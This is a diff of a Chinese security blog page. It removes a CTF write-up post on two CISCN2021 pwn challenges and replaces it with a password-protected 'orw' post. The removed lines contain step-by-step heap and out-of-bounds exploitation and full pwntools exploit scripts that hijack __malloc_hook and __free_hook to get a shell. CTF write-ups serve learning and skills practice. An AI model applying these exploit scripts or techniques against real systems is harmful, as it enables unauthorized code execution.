@@ -6,26 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://jimp.top">
-  <title>Pwn Writeup | Jimp&#39;s Blog</title>
+  <title>orw总结 | Jimp&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="五年高考三年真题">
+  <meta name="description" content="还没写完呀">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwn Writeup">
-<meta property="og:url" content="https://jimp.top/Pwn-Writeup/index.html">
+<meta property="og:title" content="orw总结">
+<meta property="og:url" content="https://jimp.top/orw%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="Jimp&#39;s Blog">
-<meta property="og:description" content="五年高考三年真题">
+<meta property="og:description" content="还没写完呀">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://pic.imgdb.cn/item/60c1d570844ef46bb2963fed.png">
-<meta property="og:image" content="https://pic.imgdb.cn/item/60c1d6e3844ef46bb2a7b082.png">
-<meta property="og:image" content="https://pic.imgdb.cn/item/60c1db57844ef46bb2dd35ef.png">
-<meta property="article:published_time" content="2021-06-09T10:50:04.000Z">
-<meta property="article:modified_time" content="2021-06-14T10:33:11.295Z">
+<meta property="article:published_time" content="2021-06-14T17:42:38.000Z">
+<meta property="article:modified_time" content="2021-06-14T17:44:00.363Z">
 <meta property="article:author" content="Jimp">
-<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pic.imgdb.cn/item/60c1d570844ef46bb2963fed.png">
   
     <link rel="alternative" href="/atom.xml" title="Jimp&#39;s Blog" type="application/atom+xml">
   
@@ -197,14 +193,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Pwn-Writeup" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-orw总结" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      Pwn Writeup
+      orw总结
     </h1>
   
 
@@ -216,8 +212,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/Pwn-Writeup/" class="archive-article-date">
-        <time datetime="2021-06-09T10:50:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
+<a href="/orw%E6%80%BB%E7%BB%93/" class="archive-article-date">
+        <time datetime="2021-06-14T17:42:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-15</time>
 </a>
 
   
@@ -230,7 +226,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.2k字</span>
+      <span class="post-count">6字</span>
     </span>
   </span>
 
@@ -239,7 +235,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">5分</span>
+      <span class="post-count">1分</span>
     </span>
   </span>
 </div>
@@ -250,64 +246,18 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <blockquote>
-<p>五年高考三年真题</p>
-</blockquote>
-<span id="more"></span>
-
-<h1 id="1-CISCN2021初赛"><a href="#1-CISCN2021初赛" class="headerlink" title="1 CISCN2021初赛"></a>1 CISCN2021初赛</h1><h2 id="1-1-pwny"><a href="#1-1-pwny" class="headerlink" title="1.1 pwny"></a>1.1 pwny</h2><blockquote>
-<p>方法有打<code>__malloc_hook</code>,打<code>write</code>功能的返回地址(我没有成功执行onegadget)  :(，打<code>exit_hook</code>(学会再说)……</p>
-</blockquote>
-<p>一开始每次运行程序都崩溃，还以为下错程序，原来忽略了一个细节：fd(文件描述符)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size_t read(int fd, void * buf, size_t count);</span><br></pre></td></tr></table></figure>
-
-<p>read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0，否则返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动</p>
-<table>
-<thead>
-<tr>
-<th align="center">整数值</th>
-<th align="center">名称</th>
-<th align="center">&lt;unistd.h&gt;符号常量</th>
-<th align="center">&lt;stdio.h&gt;文件流</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">0</td>
-<td align="center">Standard input</td>
-<td align="center">STDIN_FILENO</td>
-<td align="center">stdin</td>
-</tr>
-<tr>
-<td align="center">1</td>
-<td align="center">Standard output</td>
-<td align="center">STDOUT_FILENO</td>
-<td align="center">stdout</td>
-</tr>
-<tr>
-<td align="center">2</td>
-<td align="center">Standard error</td>
-<td align="center">STDERR_FILENO</td>
-<td align="center">stderr</td>
-</tr>
-</tbody></table>
-<p><img src="https://pic.imgdb.cn/item/60c1d570844ef46bb2963fed.png"></p>
-<p>fd指向文件<code>/dev/urandom</code></p>
-<p><img src="https://pic.imgdb.cn/item/60c1d6e3844ef46bb2a7b082.png"></p>
-<p>第一次输入索引256，将fd的值覆盖为从<code>/dev/urandom</code>文件读取到的字符，此时fd的值已经无效；第二次输入索引256，将fd的值覆盖为0；紧接着利用数组索引越界，leak出stderr的地址和off_202008的地址，进而算得libc的地址和elf的加载地址；最后利用数组索引越界，将<code>__malloc_hook</code>的内容修改为<code>realloc</code>的地址，再将<code>__realloc_hook</code>的内容修改为onegadget的地址，构成的利用链<code>malloc &gt;&gt; __malloc_hook &gt;&gt; realloc &gt;&gt; __realloc_hook &gt;&gt; onegadget</code>，利用scanf函数读取过长的输入时会调用malloc的特性就可get shell</p>
-<hr>
-<p>关于realloc对栈帧的调整：</p>
-<img src="https://pic.imgdb.cn/item/60c1db57844ef46bb2dd35ef.png" style="zoom: 67%;" />
-
-<p>上图中在push等一系列操作后，末尾就会跳转到<code>__realloc_hook</code>处执行，为了满足onegadget执行的条件，push寄存器的数量也有一定的要求，则<code>__molloc_hook</code>的内容定义为<code>realloc + offset</code> ，可以使用<code>x/20xg $rsp</code>看看堆栈的里面的数值，根据实际情况调整offset的数值</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lauch_gdb</span>():</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_con</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">lauch_gdb()</span><br><span class="line">write(<span class="number">256</span>)</span><br><span class="line">write(<span class="number">256</span>)</span><br><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFFC</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).rstrip(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leak - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f432</span></span><br><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFF5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).rstrip(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">code_base = leak - <span class="number">0x202008</span></span><br><span class="line">offset = (malloc_hook - code_base - <span class="number">0x202060</span>) / <span class="number">8</span></span><br><span class="line">write_con(offset, p64(realloc + <span class="number">8</span>)) <span class="comment"># 4/6/8</span></span><br><span class="line">write_con(offset - <span class="number">1</span>, p64(one_gadget))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span> * <span class="number">0x600</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-2-lonelywolf"><a href="#1-2-lonelywolf" class="headerlink" title="1.2 lonelywolf"></a>1.2 lonelywolf</h2><blockquote>
-<p>自己做的时候把key域直接清空，在tcache上进行double free，泄露出当前的堆块地址，使用循环将tcache填满，堆块进入unsorted bin，但是没有指向main_arena+96的位置(实在好笑)，就是不会利用tcache管理结构进行泄露libc</p>
-</blockquote>
-<p>破坏掉key域，利用show功能leak出当前堆块的地址，根据此地址推算出tcache管理结构的地址，申请tcache里的堆块，修改fd指针为tcache管理结构的地址，进而申请到tcache管理结构这个堆块，将其标志位进行修改后进行释放，这个堆块进入unsorted bin就可以泄露main_arena+96的地址，进而算得libc地址；之后就是再次修改标志位，修改堆块的fd指针，使其指向<code>__free_hook - 0x8</code>，就能申请到<code>__free_hook - 0x8</code>的堆块进行hook</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./lonelywolf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lauch_gdb</span>():</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)  </span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">lauch_gdb()</span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># beat key</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">leak_chunk = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">head = leak_chunk - <span class="number">0x250</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(head) + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0xff000000</span>)) <span class="comment">#change flag</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">4</span>) <span class="comment">#change flag</span></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook - <span class="number">0x8</span>) * <span class="number">2</span>)</span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
+    <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="c37a8f4b9071645e6164fbb48fcd8fe3363babae3c23694094fbb872a98d738f">cd28d3e0b4493b238e1a648c2b8d0b230ccf698e6271e94f80317016986da1d5</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     
 
     
@@ -321,7 +271,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://jimp.top/Pwn-Writeup/" title="Pwn Writeup" target="_blank">https://jimp.top/Pwn-Writeup/</a>
+          <a href="https://jimp.top/orw总结/" title="orw总结" target="_blank">https://jimp.top/orw总结/</a>
         </li>
         
         <li>
@@ -343,7 +293,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
@@ -410,7 +360,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://jimp.top/Pwn-Writeup/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://jimp.top/orw%E6%80%BB%E7%BB%93/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -425,18 +375,18 @@
 
 <nav id="article-nav">
   
-    <a href="/IOT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          IOT漏洞复现合集
+          学习日志
         
       </div>
     </a>
   
   
-    <a href="/Pwnable-tw/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Pwnable.tw</div>
+    <a href="/dl-runtime-resolve%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">dl_runtime_resolve总结</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -463,7 +413,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-CISCN2021%E5%88%9D%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">1 CISCN2021初赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-pwny"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 pwny</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-lonelywolf"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 lonelywolf</span></a></li></ol></li></ol>
+                    目录，不存在的…
                     </div>
                 </span>
             </div>
